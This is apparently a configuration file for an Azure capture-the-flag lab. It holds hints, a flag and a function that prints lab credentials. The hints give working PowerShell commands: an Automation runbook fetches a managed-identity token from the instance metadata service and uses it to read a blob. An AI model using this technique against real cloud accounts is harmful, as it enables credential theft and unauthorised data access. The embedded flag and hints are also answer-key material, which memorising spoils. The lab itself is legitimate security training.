from cumulonimbus.providers.base.application_configuration import ApplicationConfigurationAbstract


class ApplicationConfiguration(ApplicationConfigurationAbstract):
    def configure_application(self, **kwargs):
        pass

    def get_difficulty(self):
        return "Intermediate"

    def get_hints(self):
        return {
            1: "You have Automation Contributor on the Automation Account. This role lets you create and publish runbooks. Runbooks execute as the Automation Account's system-assigned managed identity.",
            2: "Create a PowerShell runbook that calls the Azure Instance Metadata Service to obtain an OAuth token for the storage resource: Invoke-RestMethod -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/' -Headers @{Metadata='true'}",
            3: "Use the token to call the Blob Storage REST API: Invoke-RestMethod -Uri 'https://<storage_account>.blob.core.windows.net/secrets/flag.txt' -Headers @{Authorization=\"Bearer $token\"; 'x-ms-version'='2019-12-12'}",
        }

    def get_flag(self):
        return "CUMULONIMBUS{Aut0m4t10n_Runb00k_M1_Abus3}"

    def pretty_print_tf_output(self, app_id, output):
        if not output:
            return
        print("###############################################")
        print("#             Required Information            #")
        print("###############################################")
        print("[1] Attacker username      : " + output["attacker_username"]["value"])
        print("[2] Attacker password      : " + output["attacker_password"]["value"])
        print("[3] Automation Account     : " + output["automation_account_name"]["value"])
        print("[4] Resource group         : " + output["resource_group_name"]["value"])
        print("[5] Storage account        : " + output["storage_account_name"]["value"])
        print("")
        print("Login and list runbooks:")
        print("  az login -u '{}' -p '<password>'".format(output["attacker_username"]["value"]))
        print("  az automation runbook list --automation-account-name '{}' --resource-group '{}'".format(
            output["automation_account_name"]["value"],
            output["resource_group_name"]["value"]))
